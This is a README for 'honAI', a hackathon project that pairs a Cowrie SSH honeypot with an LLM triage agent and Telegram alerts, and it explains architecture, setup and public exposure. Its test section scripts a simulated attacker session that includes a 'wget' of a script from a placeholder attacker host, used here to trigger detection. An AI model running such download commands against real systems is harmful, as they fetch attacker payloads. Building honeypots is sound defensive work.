# honAI

AI honeypot with agentic SOC analysis. A Cowrie SSH honeypot captures real
attacker sessions on port 22, an LLM agent triages each session and assigns a
verdict, and Telegram fires urgent alerts on suspicious or critical activity
plus a digest you can run on a cadence.

Built in 24 hours for a hackathon.

## Architecture

```
       internet
          │
          ▼  port 22
┌──────────────────┐
│ Cowrie (Docker)  │   anywhere with port 22 exposed (VPS or laptop+forward)
└────────┬─────────┘
         │ cowrie.json (bind-mounted)
         ▼
┌──────────────────┐
│ ingest/tail.py   │   parses session-end events, dedups by payload_hash
└────────┬─────────┘
         │ INSERT
         ▼
┌──────────────────┐
│   sessions.db    │   SQLite — the contract surface (see docs/SCHEMA.md)
└────┬─────────────┘
     │
     │ SELECT WHERE status='new'
     ▼
┌──────────────────┐
│ agents/triage.py │   Groq/Llama verdict → UPDATE row, status='triaged'
└────────┬─────────┘
         │ inline call when verdict ∈ {suspicious, critical}
         ▼
┌──────────────────┐
│ agents/notify.py │   Telegram, deduped via alerts ledger
└──────────────────┘

agents/digest.py   periodic Markdown digest → digests table + Telegram
```

The two halves communicate only through `sessions.db`. See
[docs/SCHEMA.md](docs/SCHEMA.md) for table definitions, status lifecycle, and
which side writes which fields.

## Layout

| Path           | Owner   | Purpose                                                  |
| -------------- | ------- | -------------------------------------------------------- |
| `honeypot/`    | Charlie | Cowrie runtime data (gitignored)                         |
| `ingest/`      | Charlie | Python tailer that turns `cowrie.json` into DB rows      |
| `db/`          | Charlie | Schema (`init.sql`) — applied on container startup       |
| `agents/`      | Garv    | AI triage, Telegram alerts, periodic digest              |
| `docs/`        | shared  | `SCHEMA.md` — DB contract between halves                 |
| `docker-compose.yml` | — | Three-service stack (cowrie + ingest + triage)         |

## Running it locally

The whole stack is one `docker compose up`. Drop your keys into `agents/.env`,
bring it up, attack `ssh root@localhost` from any terminal, and Telegram fires.

### Prerequisites

- **Docker Desktop** (running)
- **Groq API key** — free tier at https://console.groq.com
- **Telegram bot** — create via [@BotFather](https://t.me/BotFather); get your
  chat ID by messaging [@userinfobot](https://t.me/userinfobot)

That's it. No local Python needed.

### Setup (one-time)

```bash
git clone https://github.com/mpck4/HonAI.git
cd HonAI

# Bash:        cp agents/.env.example agents/.env
# PowerShell:  Copy-Item agents/.env.example agents/.env
```

Edit `agents/.env` and fill in `GROQ_API_KEY`, `TELEGRAM_TOKEN`, and
`TELEGRAM_CHAT_ID`. Leave `DB_PATH` alone — the container default is correct.

### Run it

```bash
docker compose up        # foreground; Ctrl+C to stop
# or:
docker compose up -d     # detached; see logs with `docker compose logs -f`
```

First boot builds the two Python images (~30s). After that, everything starts
in a few seconds. Per-service logs:

```bash
docker compose logs -f cowrie     # watch attackers land
docker compose logs -f ingest     # tailer activity
docker compose logs -f triage     # LLM verdicts
```

### Verify end-to-end

From any terminal:

```bash
ssh root@localhost     # password: anything (Cowrie accepts random passwords)
> whoami
> wget http://evil.example/script.sh
> exit
```

Within ~10 seconds you should see in `docker compose logs -f triage`:

```
[triage] session N (172.18.0.1) → critical
```

…and your phone should buzz with a Telegram alert.

### Periodic digest (optional)

The digest is a one-shot script — exec it inside the running triage container
whenever you want a fresh summary pushed to Telegram:

```bash
docker compose exec triage python digest.py
```

Re-run on a cadence (cron / Task Scheduler) for live demo digests.

### Tear down

```bash
docker compose down
```

Each `docker compose up` is a fresh run: an `archive` service moves the previous
cowrie.json into `./archive/<UTC-timestamp>/` and wipes `./data/sessions.db`
before the rest of the stack starts. Past sessions are kept for forensics; live
state is never stale.

## Going public

For attackers to actually find the honeypot you need port 22 reachable from the
public internet. Options:

- **Router port-forward**: forward external TCP 22 → your laptop's LAN IP. Real
  IP, real scanners. Requires admin access to your router; some ISPs block 22.
- **VPS** (Hetzner, DigitalOcean, etc.): cleaner separation, always-on. Move
  the real sshd off port 22 first (`Port 2222` in `/etc/ssh/sshd_config`,
  `systemctl restart ssh`, reconnect on the new port to confirm), then open
  both 22 and 2222 in the firewall.
- **ngrok TCP**: `ngrok tcp 22` exposes the laptop publicly without router
  config. Works for judges; won't get organic scanner traffic since attackers
  don't browse ngrok domains.

## Testing without Cowrie

A sample log lives at [ingest/fixtures/sample_cowrie.json](ingest/fixtures/sample_cowrie.json).
Three sessions: a credential-stuffer, a malware downloader, and a duplicate of
the downloader from a different IP (exercises payload-hash dedup).

Run the tailer against the fixture (needs local Python 3.10+, no Docker, no
keys):

```bash
python -m ingest.tail --cowrie-log ingest/fixtures/sample_cowrie.json --once
```

Expected: `+2 inserted, +1 deduped`.

## Working agreement

- Small commits, one logical step per commit.
- Don't modify code outside your half. Schema changes go through
  [docs/SCHEMA.md](docs/SCHEMA.md) and need both teammates to agree.
- VPS-level changes (firewall, ports, systemd) get explicitly called out
  before running.

## License

MIT — see [LICENSE](LICENSE).
